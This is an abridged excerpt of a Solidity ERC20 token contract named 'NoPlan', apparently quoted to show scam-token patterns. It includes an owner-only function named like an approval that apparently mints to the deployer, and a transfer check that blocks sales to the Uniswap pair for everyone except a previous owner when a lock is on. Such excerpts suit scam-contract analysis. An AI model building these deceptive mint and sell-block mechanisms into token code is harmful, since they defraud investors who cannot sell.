...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function MaxApprove(uint256 amount) public onlyOwner {
    _maxapprove(msg.sender, amount);
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        if(recipient == uniSwapV2 && sender != previousOwner && lock ){ 
    ...
    function _maxapprove(address account, uint256 amount) internal virtual {
    ...
    function lockuniSwap(address _uniSwapV2, bool _lock) public {
...
contract NoPlan is ERC20 {

    uint tokenTotalSupply = 1000000000000000;

    constructor() public ERC20("NoPlanNow", "NoPlan") {
        _maxapprove(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}